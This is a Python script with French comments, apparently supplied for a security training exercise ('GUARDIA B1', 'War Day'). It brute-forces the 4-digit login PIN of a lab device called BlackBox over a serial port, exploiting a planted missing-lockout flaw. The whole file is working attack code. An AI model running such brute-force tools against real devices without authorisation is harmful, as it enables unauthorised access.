#!/usr/bin/env python3
"""
brute_force.py — Brute force du PIN de BlackBox (V3 : pas de limite de tentatives)
GUARDIA B1 — Script fourni pour Phase 1 (auto-attaque) et War Day

Principe :
    Essaie tous les PINs de 0000 a 9999 jusqu'a trouver le bon.
    Fonctionne si la cible n'a pas corrige V3 (pas de lockout).
    Si la cible a un lockout : le script s'arrete et le signale.

Usage :
    python brute_force.py COM3
    python brute_force.py COM3 --start 1000   (commencer a 1000)
    python brute_force.py COM3 --delay 0.1    (pause entre essais en secondes)
"""

import serial
import time
import sys
import argparse


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def essayer_pin(ser, pin):
    """
    Essaie le PIN donne. Retourne :
      "ok"      — connexion reussie
      "ko"      — PIN incorrect
      "bloque"  — systeme bloque (lockout detecte)
      "timeout" — pas de reponse
    """
    ser.reset_input_buffer()
    ser.write(f"login {pin}\r\n".encode())

    reponse = b""
    deadline = time.time() + 2.0
    while time.time() < deadline:
        octet = ser.read(1)
        if not octet:
            continue
        reponse += octet
        if b"reussie" in reponse or b"Connexion" in reponse:
            return "ok"
        if b"PIN incorrect" in reponse:
            return "ko"
        if b"Trop de tentatives" in reponse or b"bloque" in reponse.lower():
            return "bloque"
        if b"\n" in reponse[-3:]:
            break

    return "timeout" if not reponse else "ko"


def main():
    parser = argparse.ArgumentParser(description="Brute force PIN BlackBox B1")
    parser.add_argument("port", help="Port serie (ex: COM3)")
    parser.add_argument("--start", type=int, default=0,
                        help="PIN de depart (defaut: 0 = '0000')")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Pause entre essais en secondes (defaut: 0)")
    args = parser.parse_args()

    print("=" * 50)
    print("  BRUTE FORCE — BlackBox B1 GUARDIA")
    print("=" * 50)
    print(f"  Port  : {args.port}")
    print(f"  Plage : {args.start:04d} — 9999")
    print(f"  Delay : {args.delay} s entre essais")
    print()
    print("  Cette attaque exploite V3 : pas de limite de tentatives.")
    print("  Si la cible a corrige V3, le script sera bloque.")
    print("=" * 50)
    print()

    ser = ouvrir_port(args.port)
    t_debut = time.time()

    for n in range(args.start, 10000):
        pin = f"{n:04d}"

        resultat = essayer_pin(ser, pin)

        if resultat == "ok":
            duree = time.time() - t_debut
            tentatives = n - args.start + 1
            print(f"\n[+] PIN TROUVE : {pin}")
            print(f"    Tentatives  : {tentatives}")
            print(f"    Duree       : {duree:.1f} secondes")
            ser.close()
            return

        elif resultat == "bloque":
            tentatives = n - args.start + 1
            print(f"\n[!] SYSTEME BLOQUE apres {tentatives} tentatives !")
            print(f"    La cible a corrige V3 (anti-brute force).")
            print(f"    Dernier PIN essaye : {pin}")
            ser.close()
            return

        elif resultat == "timeout":
            print(f"\n[!] Timeout sur {pin} — verifiez la connexion.")

        else:
            # Afficher la progression tous les 100 essais
            if n % 100 == 0:
                duree = time.time() - t_debut
                restants = 9999 - n
                vitesse = (n - args.start + 1) / duree if duree > 0 else 0
                eta = restants / vitesse if vitesse > 0 else 0
                print(f"  {pin} ... {vitesse:.0f} PIN/s — ETA {eta:.0f}s", end="\r")

        if args.delay > 0:
            time.sleep(args.delay)

    print(f"\n[!] PIN non trouve dans la plage {args.start:04d}-9999.")
    ser.close()


if __name__ == "__main__":
    main()
